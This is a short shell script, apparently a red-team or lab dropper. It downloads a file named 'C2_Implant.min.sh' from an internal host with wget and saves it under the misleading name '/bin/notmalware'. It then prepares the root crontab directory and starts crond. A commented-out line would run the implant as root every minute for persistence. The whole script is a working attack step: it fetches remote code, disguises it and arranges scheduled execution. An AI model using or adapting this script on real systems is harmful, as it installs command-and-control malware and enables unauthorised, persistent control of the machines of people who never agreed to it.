A="http://10.0.1.4/C2_Implant.min.sh"
B="/bin/notmalware"

mkdir -p $(dirname $B)

wget $A -O $B
mkdir -p /var/spool/cron/crontabs
#echo "* * * * * bash $B" > /var/spool/cron/crontabs/root
crond
